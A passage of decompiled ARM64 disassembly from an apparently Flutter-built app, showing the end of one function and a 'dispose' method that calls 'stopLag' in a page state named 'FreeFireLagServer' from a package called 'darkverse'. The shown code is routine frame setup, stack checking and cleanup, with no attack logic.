    //     0x87e058: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x87e05c: ldur            x1, [fp, #-8]
    // 0x87e060: StoreField: r0->field_f = r1
    //     0x87e060: stur            w1, [x0, #0xf]
    // 0x87e064: r1 = 24
    //     0x87e064: mov             x1, #0x18
    // 0x87e068: StoreField: r0->field_b = r1
    //     0x87e068: stur            w1, [x0, #0xb]
    // 0x87e06c: LeaveFrame
    //     0x87e06c: mov             SP, fp
    //     0x87e070: ldp             fp, lr, [SP], #0x10
    // 0x87e074: ret
    //     0x87e074: ret             
  }
  _ dispose(/* No info */) {
    // ** addr: 0x9adb64, size: 0x30
    // 0x9adb64: EnterFrame
    //     0x9adb64: stp             fp, lr, [SP, #-0x10]!
    //     0x9adb68: mov             fp, SP
    // 0x9adb6c: CheckStackOverflow
    //     0x9adb6c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9adb70: cmp             SP, x16
    //     0x9adb74: b.ls            #0x9adb8c
    // 0x9adb78: r0 = stopLag()
    //     0x9adb78: bl              #0x877ac0  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::stopLag
    // 0x9adb7c: r0 = Null
    //     0x9adb7c: mov             x0, NULL
    // 0x9adb80: LeaveFrame
    //     0x9adb80: mov             SP, fp
    //     0x9adb84: ldp             fp, lr, [SP], #0x10
    // 0x9adb88: ret
    //     0x9adb88: ret             
    // 0x9adb8c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9adb8c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9adb90: b               #0x9adb78
  }
}
